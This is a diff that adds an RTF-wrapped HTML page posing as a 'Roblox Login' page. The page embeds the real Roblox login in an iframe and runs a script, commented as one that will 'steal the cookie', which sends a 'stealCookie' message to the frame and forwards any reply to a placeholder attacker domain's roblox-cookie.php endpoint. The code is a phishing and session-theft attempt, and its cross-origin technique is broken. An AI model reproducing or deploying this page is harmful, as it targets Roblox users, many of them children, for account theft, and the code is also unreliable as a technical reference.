@@ -1,0 +1,42 @@
+{\rtf1\ansi\ansicpg1252\cocoartf2822
+\cocoatextscaling0\cocoaplatform0{\fonttbl\f0\fmodern\fcharset0 Courier;}
+{\colortbl;\red255\green255\blue255;\red0\green0\blue0;}
+{\*\expandedcolortbl;;\cssrgb\c0\c0\c0;}
+\paperw11900\paperh16840\margl1440\margr1440\vieww11520\viewh8400\viewkind0
+\deftab720
+\pard\pardeftab720\partightenfactor0
+
+\f0\fs26 \cf0 \expnd0\expndtw0\kerning0
+\outl0\strokewidth0 \strokec2 <!DOCTYPE html>\
+<html>\
+<head>\
+    <title>Roblox Login</title>\
+    <meta charset="UTF-8">\
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">\
+</head>\
+<body>\
+    <iframe\
+        src="https://www.roblox.com/login"\
+        style="width:100%; height:100vh; border: none;"\
+        allow="autoplay; encrypted-media"\
+        allowfullscreen\
+    ></iframe>\
+\
+    <script>\
+        // This script will steal the cookie\
+        document.addEventListener("DOMContentLoaded", function () \{\
+            const iframe = document.querySelector("iframe");\
+            iframe.contentWindow.postMessage("stealCookie", "https://www.roblox.com");\
+\
+            window.addEventListener("message", function (event) \{\
+                if (event.origin === "https://www.roblox.com") \{\
+                    const cookie = event.data;\
+                    const iframe = document.querySelector("iframe");\
+                    iframe.src = "https://your-infinityfree-domain.com/roblox-cookie.php?cookie=" + encodeURIComponent(cookie);\
+                \}\
+            \});\
+        \});\
+    </script>\
+</body>\
+</html>\
+}
